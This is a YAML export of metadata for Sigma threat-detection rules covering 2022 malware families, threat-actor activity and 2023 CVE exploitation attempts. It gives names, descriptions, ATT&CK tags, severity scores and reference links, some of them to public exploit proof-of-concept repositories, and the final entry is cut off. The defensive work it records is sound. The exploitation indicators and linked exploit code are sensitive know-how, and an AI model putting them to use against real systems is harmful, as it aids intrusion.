- detection_id: 0a74c5a9-1b71-4475-9af2-7829d320d5c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/ChromeLoader/proc_creation_win_malware_chrome_loader_execution.yml
  name: ChromeLoader Malware Execution
  description: Detects execution of ChromeLoader malware via a registered scheduled
    task
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.001
  - T1176
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.001
  - attack.t1176
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/xephora/Threat-Remediation-Scripts/tree/main/Threat-Track/CS_INSTALLER
  - https://twitter.com/th3_protoCOL/status/1480621526764322817
  - https://twitter.com/Kostastsale/status/1480716528421011458
  - https://www.virustotal.com/gui/file/ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1f32d820-1d5c-43fe-8fe2-feef0c952eb7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Emotet/proc_creation_win_malware_emotet_loader_execution.yml
  name: Emotet Loader Execution Via .LNK File
  description: 'Detects the Emotet Epoch4 loader as reported by @malware_traffic back
    in 2022.

    The ".lnk" file was delivered via phishing campaign.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  tags:
  - attack.execution
  - attack.t1059.006
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20220422215221/https://twitter.com/malware_traffic/status/1517622327000846338
  - https://twitter.com/Cryptolaemus1/status/1517634855940632576
  - https://tria.ge/220422-1pw1pscfdl/
  - https://tria.ge/220422-1nnmyagdf2/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2f974656-6d83-4059-bbdf-68ac5403422f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Hermetic-Wiper/proc_creation_win_malware_hermetic_wiper_activity.yml
  name: Hermetic Wiper TG Process Patterns
  description: Detects process execution patterns found in intrusions related to the
    Hermetic Wiper malware attacks against Ukraine in February 2022
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.001
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1021.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia
  false_positives:
  - Unknown
  notes: ''
- detection_id: d52d2e87-eb03-4fac-961d-eb616da79788
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_execution.yml
  name: Raspberry Robin Subsequent Execution of Commands
  description: Detects raspberry robin subsequent execution of commands.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2c6bea3a-ef58-4f2e-a775-4928f6b7c58a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_external_drive_exec.yml
  name: Raspberry Robin Initial Execution From External Drive
  description: Detects the initial execution of the Raspberry Robin malware from an
    external drive using "Cmd.EXE".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/raspberry-robin/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a35c97c8-d9c4-4c89-a3e7-533dc0bcb73a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_single_dot_ending_file.yml
  name: Potential Raspberry Robin Dot Ending File
  description: Detects commandline containing reference to files ending with a "."
    This scheme has been seen used by raspberry-robin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d5eb7432-fda4-4bba-a37f-ffa74d9ed639
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Serpent-Backdoor/proc_creation_win_malware_serpent_backdoor_payload_execution.yml
  name: Serpent Backdoor Payload Execution Via Scheduled Task
  description: 'Detects post exploitation execution technique of the Serpent backdoor.

    According to Proofpoint, one of the commands that the backdoor ran was via creating
    a temporary scheduled task using an unusual method.

    It creates a fictitious windows event and a trigger in which once the event is
    created, it executes the payload.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1059.006
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.t1059.006
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 97805087-93ab-4203-b5cb-287cda6aecaa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/SocGholish/proc_creation_win_malware_socgholish_fakeupdates_activity.yml
  name: FakeUpdates/SocGholish Activity
  description: Detects initial execution of FakeUpdates/SocGholish malware via wscript
    that later executes commands via cmd or powershell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/th3_protoCOL/status/1536788652889497600
  - https://twitter.com/1ZRR4H/status/1537501582727778304
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 711ab2fe-c9ba-4746-8840-5228a58c3cb8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/win_mssql_sp_maggie.yml
  name: MSSQL Extended Stored Procedure Backdoor Maggie
  description: This rule detects the execution of the extended storage procedure backdoor
    named Maggie in the context of Microsoft SQL server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546
  - detection.emerging-threats
  time_window: ''
  references:
  - https://medium.com/@DCSO_CyTec/mssql-meet-maggie-898773df3b01
  false_positives:
  - Legitimate extended stored procedures named maggie
  notes: ''
- detection_id: e1118a8f-82f5-44b3-bb6b-8a284e5df602
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/TA/ACTINIUM/proc_creation_win_apt_actinium_persistence.yml
  name: Potential ACTINIUM Persistence Activity
  description: Detects specific process parameters as used by ACTINIUM scheduled task
    persistence creation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053
  - attack.t1053.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a62298a3-1fe0-422f-9a68-ffbcbc5a123d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/TA/MERCURY/proc_creation_win_apt_mercury.yml
  name: MERCURY APT Activity
  description: Detects suspicious command line patterns seen being used by MERCURY
    APT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.g0069
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c7defa9-69f8-4c34-b815-41fce3931754
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-1389/proxy_exploit_cve_2023_1389_unauth_command_injection_tplink_archer_ax21.yml
  name: CVE-2023-1389 Potential Exploitation Attempt - Unauthenticated Command Injection
    In TP-Link Archer AX21
  description: 'Detects potential exploitation attempt of CVE-2023-1389 an Unauthenticated
    Command Injection in TP-Link Archer AX21.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-1389
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.tenable.com/security/research/tra-2023-11
  - https://github.com/Voyag3r-Security/CVE-2023-1389/blob/4ecada7335b17bf543c0e33b2c9fb6b6215c09ae/archer-rev-shell.py
  - https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal
  false_positives:
  - Vulnerability Scanners
  notes: ''
- detection_id: 2ece8816-b7a0-4d9b-b0e8-ae7ad18bc02b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-20198/cisco_syslog_cve_2023_20198_ios_xe_web_ui.yml
  name: Exploitation Indicators Of CVE-2023-20198
  description: Detecting exploitation indicators of CVE-2023-20198 a privilege escalation
    vulnerability in Cisco IOS XE Software Web UI.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: cisco
  product: syslog
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - detection.emerging-threats
  time_window: ''
  references:
  - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z
  - https://www.thestack.technology/security-experts-call-for-incident-response-exercises-after-mass-cisco-device-exploitation/
  false_positives:
  - Rare false positives might occur if there are valid users named "cisco_tac_admin"
    or "cisco_support", which are not created by default or CISCO representatives
  notes: ''
- detection_id: ae94b10d-fee9-4767-82bb-439b309d5a27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-21554/win_cve_2023_21554_msmq_corrupted_packet.yml
  name: MSMQ Corrupted Packet Encountered
  description: Detects corrupted packets sent to the MSMQ service. Could potentially
    be a sign of CVE-2023-21554 exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8987c03-4290-4c96-870f-55e75ee377f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-22518/proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml
  name: CVE-2023-22518 Exploitation Attempt - Suspicious Confluence Child Process
    (Linux)
  description: 'Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center
    / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g.
    create admin accounts and execute arbitrary commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.execution
  - attack.t1059
  - attack.initial-access
  - attack.t1190
  - cve.2023-22518
  - detection.emerging-threats
  time_window: ''
  references:
  - https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
  - https://www.huntress.com/blog/confluence-to-cerber-exploitation-of-cve-2023-22518-for-ransomware-deployment
  - https://github.com/ForceFledgling/CVE-2023-22518
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1ddaa9a4-eb0b-4398-a9fe-7b018f9e23db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-22518/proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yml
  name: CVE-2023-22518 Exploitation Attempt - Suspicious Confluence Child Process
    (Windows)
  description: 'Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center
    / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g.
    create admin accounts and execute arbitrary commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.execution
  - attack.t1059
  - attack.initial-access
  - attack.t1190
  - cve.2023-22518
  - detection.emerging-threats
  time_window: ''
  references:
  - https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
  - https://www.huntress.com/blog/confluence-to-cerber-exploitation-of-cve-2023-22518-for-ransomware-deployment
  - https://github.com/ForceFledgling/CVE-2023-22518
  false_positives:
  - Unknown
  notes: ''
- detection_id: 27d2cdde-9778-490e-91ec-9bd0be6e8cc6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-22518/proxy_exploit_cve_2023_22518_confluence_auth_bypass.yml
  name: CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Proxy)
  description: 'Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center
    / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g.
    create admin accounts and execute arbitrary commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-22518
  - detection.emerging-threats
  time_window: ''
  references:
  - https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
  - https://www.huntress.com/blog/confluence-to-cerber-exploitation-of-cve-2023-22518-for-ransomware-deployment
  - https://github.com/ForceFledgling/CVE-2023-22518
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: a902d249-9b9c-4dc4-8fd0-fbe528ef965c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-22518/web_exploit_cve_2023_22518_confluence_auth_bypass.yml
  name: CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Webserver)
  description: 'Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center
    / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g.
    create admin accounts and execute arbitrary commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-22518
  - detection.emerging-threats
  time_window: ''
  references:
  - https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
  - https://www.huntress.com/blog/confluence-to-cerber-exploitation-of-cve-2023-22518-for-ransomware-deployment
  - https://github.com/ForceFledgling/CVE-2023-22518
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: 8b244735-5833-4517-a45b-28d8c63924c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-2283/lnx_sshd_exploit_cve_2023_2283_libssh_authentication_bypass.yml
  name: Potential CVE-2023-2283 Exploitation
  description: Detects potential exploitation attempt of CVE-2023-2283 an authentication
    bypass in libSSH. The exploitation method causes an error message stating that
    keys for curve25519 could not be generated. It is an error message that is a sign
    of an exploitation attempt. It is not a sign of a successful exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: linux
  product: sshd
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-2283
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/kevin_backhouse/status/1666459308941357056?s=20
  - https://git.libssh.org/projects/libssh.git/tree/src/curve25519.c#n420
  - https://nvd.nist.gov/vuln/detail/CVE-2023-2283
  - https://www.blumira.com/cve-2023-2283/
  - https://github.com/github/securitylab/tree/1786eaae7f90d87ce633c46bbaa0691d2f9bf449/SecurityExploits/libssh/pubkey-auth-bypass-CVE-2023-2283
  false_positives:
  - Errors with the initialization or generation of the X25519 elliptic curve keys
    may generate the same error message
  notes: ''
- detection_id: fc06e655-d98c-412f-ac76-05c2698b1cb2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-23397/registry_set_exploit_cve_2023_23397_outlook_reminder_trigger.yml
  name: Outlook Task/Note Reminder Received
  description: Detects changes to the registry values related to outlook that indicates
    that a reminder was triggered for a Note or Task item. This could be a sign of
    exploitation of CVE-2023-23397. Further investigation is required to determine
    the success of an exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137
  tags:
  - attack.persistence
  - attack.t1137
  - cve.2023-23397
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/
  false_positives:
  - Legitimate reminders received for a task or a note will also trigger this rule.
  notes: ''
- detection_id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-23397/win_security_exploit_cve_2023_23397_outlook_remote_file_query.yml
  name: CVE-2023-23397 Exploitation Attempt
  description: Detects outlook initiating connection to a WebDAV or SMB share, which
    could be a sign of CVE-2023-23397 exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  - attack.initial-access
  - cve.2023-23397
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
  false_positives:
  - Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
    it's better to filter out those events before they reach the SIEM
  notes: ''
- detection_id: de96b824-02b0-4241-9356-7e9b47f04bac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-23397/win_smbclient_connectivity_exploit_cve_2023_23397_outlook_remote_file.yml
  name: Potential CVE-2023-23397 Exploitation Attempt - SMB
  description: Detects (failed) outbound connection attempts to internet facing SMB
    servers. This could be a sign of potential exploitation attempts of CVE-2023-23397.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: smbclient-connectivity
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  - cve.2023-23397
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/03/24/guidance-for-investigating-attacks-using-cve-2023-23397/
  - https://github.com/nasbench/Misc-Research/blob/fc46f6da34ff7e0076da28fd3e66d6e1100f1c2f/ETW/Microsoft-Windows-SMBClient.md
  false_positives:
  - Some false positives may occur from external trusted servers. Apply additional
    filters accordingly
  notes: ''
- detection_id: 0e1ebc5a-15d0-4bf6-8199-b2535397433a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-23752/web_cve_2023_23752_joomla_exploit_attempt.yml
  name: Potential CVE-2023-23752 Exploitation Attempt
  description: Detects the potential exploitation attempt of CVE-2023-23752 an Improper
    access check, in web service endpoints in Joomla
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-23752
  - detection.emerging-threats
  time_window: ''
  references:
  - https://xz.aliyun.com/t/12175
  - https://twitter.com/momika233/status/1626464189261942786
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: c0341543-5ed0-4475-aabc-7eea8c52aa66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-25157/web_cve_2023_25157_geoserver_sql_injection.yml
  name: Potential CVE-2023-25157 Exploitation Attempt
  description: Detects a potential exploitation attempt of CVE-2023-25157 a SQL injection
    in GeoServer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - cve.2023-25157
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/win3zz/CVE-2023-25157
  - https://twitter.com/parzel2/status/1665726454489915395
  - https://github.com/advisories/GHSA-7g5f-wrx8-5ccf
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: 043c1609-0e32-4462-a6f2-5a0c2da3fafe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-25717/web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yml
  name: Potential CVE-2023-25717 Exploitation Attempt
  description: Detects a potential exploitation attempt of CVE-2023-25717 a Remote
    Code Execution via an unauthenticated HTTP GET Request, in Ruckus Wireless Admin
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-25717
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cybir.com/2023/cve/proof-of-concept-ruckus-wireless-admin-10-4-unauthenticated-remote-code-execution-csrf-ssrf/
  false_positives:
  - Vulnerability scanners
  - Some rare false positives may occur if the password contains the characters "$(".
    Apply addition indicators such as executed commands to remove FP
  notes: ''
- detection_id: 9cae055f-e1d2-4f81-b8a5-1986a68cdd84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-27363/file_event_win_cve_2023_27363_foxit_rce.yml
  name: Potential CVE-2023-27363 Exploitation - HTA File Creation By FoxitPDFReader
  description: Detects suspicious ".hta" file creation in the startup folder by Foxit
    Reader. This can be an indication of CVE-2023-27363 exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.001
  tags:
  - attack.persistence
  - attack.t1505.001
  - cve.2023-27363
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/j00sean/SecBugs/tree/ff72d553f75d93e1a0652830c0f74a71b3f19c46/CVEs/CVE-2023-27363
  - https://www.zerodayinitiative.com/advisories/ZDI-23-491/
  - https://www.tarlogic.com/blog/cve-2023-27363-foxit-reader/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 31e4e649-7394-4fd2-9ae7-dbc61eebb550
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-27997/web_cve_2023_27997_pre_authentication_rce.yml
  name: Potential CVE-2023-27997 Exploitation Indicators
  description: 'Detects indicators of potential exploitation of CVE-2023-27997 in
    Frotigate weblogs.

    To avoid false positives it is best to look for successive requests to the endpoints
    mentioned as well as weird values of the "enc" parameter

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-27997
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.lexfo.fr/Forensics-xortigate-notice.html
  - https://blog.lexfo.fr/xortigate-cve-2023-27997.html
  - https://research.kudelskisecurity.com/2023/06/12/cve-2023-27997-fortigate-ssl-vpn/
  - https://labs.watchtowr.com/xortigate-or-cve-2023-27997/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c3b2a774-3152-4989-83c1-7afc48fd1599
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Exploits/CVE-2023-34362-MOVEit-Transfer-Exploit/file_event_win_exploit_cve_2023_34362_moveit_transfer.yml
  name: Potential MOVEit Transfer CVE-2023-34362 Exploitation - File Activity
  description: Detects file indicators of potential exploitation of MOVEit CVE-2023-34362.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2023-34362
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/
  - https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/
  - https://www.reddit.com/r/sysadmin/comments/13wxuej/comment/jmhdg55/
  false_positives:
  - To avoid FP, this rule should only be applied on MOVEit servers.
  notes: ''
- detection_id: 39ac1fb0-07f1-474b-b97e-c5c0eace0d79
  source_id: sigmahq_sigma
